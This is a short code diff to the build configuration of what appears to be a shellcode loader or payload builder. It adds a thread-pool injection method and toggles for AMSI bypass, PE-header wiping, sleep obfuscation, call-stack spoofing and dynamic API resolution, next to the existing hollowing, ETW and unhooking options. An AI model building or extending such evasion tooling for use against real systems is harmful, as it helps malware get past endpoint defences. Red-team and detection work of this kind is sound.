@@ -40,6 +40,7 @@ INJECT_REMOTETHREAD = "remotethread"
 INJECT_THREADPOOL = INJECT_REMOTETHREAD  # Backward-compat alias
 INJECT_HOLLOWING = "hollowing"
 INJECT_MAPPING = "mapping"
+INJECT_THREADPOOL_REAL = "threadpool_real"
 
 # ============================================================================
 # Default Profile
@@ -58,6 +59,11 @@ DEFAULT_PROFILE = {
     "unhook": False,
     "sleep": 0,
     "debug": False,
+    "sleep_obfuscation": False,
+    "amsi": True,
+    "wipe_pe": True,
+    "callstack_spoof": False,
+    "dynapi": False,
 }
 
 # ============================================================================
@@ -81,6 +87,11 @@ class BuildConfig:
     sandbox: bool = True
     etw: bool = True
     unhook: bool = False
+    sleep_obfuscation: bool = False
+    amsi: bool = True
+    wipe_pe: bool = True
+    callstack_spoof: bool = False
+    dynapi: bool = False
     
     # Runtime options
     sleep: int = 0
@@ -115,7 +126,8 @@ class BuildConfig:
         
         # Validate injection
         valid_inject = [INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD,
-                       "threadpool", INJECT_HOLLOWING, INJECT_MAPPING]
+                       "threadpool", INJECT_HOLLOWING, INJECT_MAPPING,
+                       INJECT_THREADPOOL_REAL]
         if self.inject not in valid_inject:
             return False, f"Invalid injection method: {self.inject}"
         
